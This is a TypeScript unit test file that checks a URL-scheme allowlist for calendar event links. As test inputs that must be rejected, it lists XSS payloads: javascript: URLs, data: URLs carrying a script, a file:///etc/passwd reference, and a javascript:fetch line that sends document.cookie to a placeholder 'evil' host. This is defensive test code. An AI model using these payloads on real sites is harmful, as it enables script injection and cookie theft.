/**
 * Tests for sanitizeIcsUrl — the URL scheme allowlist applied at the
 * EventCalendarAdapter data boundary.
 *
 * The ICS URL property is rendered into ``<a href={url}>`` in the UI
 * (see VideoConferenceSection). React only blocks ``javascript:`` URLs
 * in development; production builds let them through. We sanitize at
 * the data boundary so every UI consumer is safe by default — and we
 * pin that contract here.
 */
import { describe, it, expect } from "vitest";
import { sanitizeIcsUrl } from "../EventCalendarAdapter";

describe("sanitizeIcsUrl", () => {
  describe("safe schemes pass through", () => {
    it.each([
      ["https://meet.example.com/abc", "https://meet.example.com/abc"],
      ["http://meet.example.com/abc", "http://meet.example.com/abc"],
      ["mailto:host@example.com", "mailto:host@example.com"],
      ["tel:+33123456789", "tel:+33123456789"],
      ["  https://meet.example.com/abc  ", "https://meet.example.com/abc"],
      ["HTTPS://meet.example.com/abc", "HTTPS://meet.example.com/abc"],
    ])("%s → %s", (raw, expected) => {
      expect(sanitizeIcsUrl(raw)).toBe(expected);
    });
  });

  describe("unsafe schemes are dropped", () => {
    it.each([
      "javascript:alert(document.cookie)",
      "JAVASCRIPT:alert(1)",
      "  javascript:alert(1)",
      "data:text/html,<script>alert(1)</script>",
      "vbscript:msgbox(1)",
      "file:///etc/passwd",
      "//evil.example.com/path", // protocol-relative
      "/relative/path",
      "relative-path",
      "",
      "not a url at all",
    ])("%s is dropped", (raw) => {
      expect(sanitizeIcsUrl(raw)).toBeUndefined();
    });

    it("null is dropped", () => {
      expect(sanitizeIcsUrl(null)).toBeUndefined();
    });

    it("undefined is dropped", () => {
      expect(sanitizeIcsUrl(undefined)).toBeUndefined();
    });
  });

  describe("regression — javascript: never reaches a consumer", () => {
    // This test exists to make the security contract explicit. If
    // someone changes sanitizeIcsUrl to allow javascript: URLs in the
    // future, this test must fail loudly so the change is intentional.
    const dangerous = [
      "javascript:void(0)",
      'javascript:fetch("//evil/"+document.cookie)',
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ];
    for (const url of dangerous) {
      it(`refuses ${url}`, () => {
        expect(sanitizeIcsUrl(url)).toBeUndefined();
      });
    }
  });
});
